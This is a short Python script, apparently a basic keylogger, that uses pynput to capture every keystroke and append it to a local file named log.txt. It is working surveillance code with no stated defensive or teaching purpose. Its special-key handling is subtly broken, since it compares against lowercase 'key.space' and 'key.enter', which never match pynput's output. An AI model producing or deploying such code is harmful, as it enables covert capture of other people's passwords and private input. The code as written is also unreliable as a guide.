from pynput.keyboard import Listener

def writeto_file(key):
    data = str(key)
    data = data.replace("'","")
    
    if data == 'key.space':
        data = ' '
    if data == 'key.enter':
        data = "\n"
    
    with open("log.txt", "a") as f:
        f.write(data)

with Listener(on_press = writeto_file) as l:
    l.join()

